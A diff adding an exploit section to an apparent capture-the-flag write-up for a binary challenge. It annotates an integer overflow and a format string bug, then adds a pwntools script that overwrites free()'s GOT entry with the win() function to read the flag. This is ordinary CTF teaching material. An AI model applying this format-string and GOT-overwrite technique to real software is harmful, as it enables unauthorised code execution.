@@ -34,7 +34,7 @@ int calculate_rating(){
     return 0;
 }
 
-void win() {
+void win() {      // Our target
     char flag[128];
     FILE *fp = fopen("flag.txt", "r");
     if (fp) {
@@ -47,15 +47,15 @@ void win() {
 
 static inline int validate_size(uint32_t sz) {
     size_t aligned = (sz + 7) & ~7;
-    return (int)aligned; 
+    return (int)aligned;          // typecasting, potential Integer overflow bug
 }
 
 void process_stream() {
-    uint32_t header[3];
+    uint32_t header[3]; // 4 bytes each, positive values
     
-    if (fread(header, 1, 12, stdin) < 10) exit(1);
+    if (fread(header, 1, 12, stdin) < 10) exit(1);   // user input for file header (magic, t_len, d_len) 
     /*file magic*/
-    if (header[0] != 0x564d576e) return;
+    if (header[0] != 0x564d576e) return;   // magic check
 
     uint16_t t_len = (uint16_t)(header[1] & 0xFFFF);
     uint32_t d_len = header[2];
@@ -110,10 +110,119 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 * `Partial RELRO`: GOT is overwritable
 * `No canary`: no canary check when BOFing
 * `No PIE`: the binary addresses stay fixed
+
+___
+### Exploit:
+**First**
+We initially have a structure:
+```c
+uint32_t header[3];
+```
+which consists of the following elements:
+```c
+- magic_num
+- t_len
+- d_len
+```
+and requires us to manually fill those datas:
+```c
+fread(header, 1, 12, stdin)
+```
+
+**Second**
+We do see a bug inside a function:
+
+Integer overflow:
+
+<img width="754" height="394" alt="image" src="https://github.com/user-attachments/assets/34210c36-3846-4711-95f7-879b3fb80b89" />
+
+In `main()`, a call to a function with `d_len` as argument:
+```c
+validate_size(d_len) > 2048
+```
+To the function:
+```c
+static inline int validate_size(uint32_t sz) {
+    size_t aligned = (sz + 7) & ~7;
+    return (int)aligned;          // typecasting, potential Integer overflow bug
+}
+```
+We can leverage this bug to bypass the check
+
+**Third**
+We spot a formatstring vulnerbility inside the code:
+
+```c
+    if (title) {
+        printf("Entry: ");
+        printf(title);             // print out `title` ==> formatstring vuln
+        printf("\n");
+    }
+```
+With this, we have the ability to perform: arbitrary write, arbitrary read. But only once
+
+Especially when we have the fixed address of `win`, we could overwrite it somewhere so it can be triggered
+
+**Conclusion**
+Our strategy: format string + GOT overwrite:
+
+1. Send the correct file magic
+2. Create a formatstring payload that overwrite the GOT address of `free()` with our `win()`. Both addresses r fixed.
+3. Set `t_len` to the exact length of our payload
+4. Set `d_len` to a valid size (maybe 16)
+5. Send the header data, then our payload, then dummy data for the stream
+6. When `printf(title)` executes, it performs the overwrite
+7. And finally, `free()` is called, it will actually call to `win()`
+
 ___
 Script: `scrript.py`:
 ```python
+from pwn import *
 
+elf = context.binary = ELF('./chall')
+context.binary = exe = ELF("./chall", checksec=False)
+context.log_level = "debug"
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br process_stream
+		br *process_stream+35
+		br *process_stream+59
+
+		br *process_stream+134
+		br *process_stream+139
+
+		br *process_stream+372
+		br *process_stream+377
+		''')
+
+#nc.umbccd.net:8925
+# p = remote("nc.umbccd.net", 8925)
+
+p = process(exe.path)
+GDB()
+
+win = elf.sym['win']
+target = elf.got['free']
+offset = 6
+
+payload = fmtstr_payload(offset, {target: win})
+print(f"payload: {payload}\n")
+print(f"payload-len: {len(payload)}\n")
+
+# payload = b"%6$p"
+
+magic = p32(0x564d576e)
+t_len = p16(len(payload)) + p16(0) 
+d_len = p32(16)
+
+header = magic + t_len + d_len
+
+p.send(header)
+p.send(payload)
+p.send(b"B" * 16)
+
+p.interactive()
 ```
 
 ___
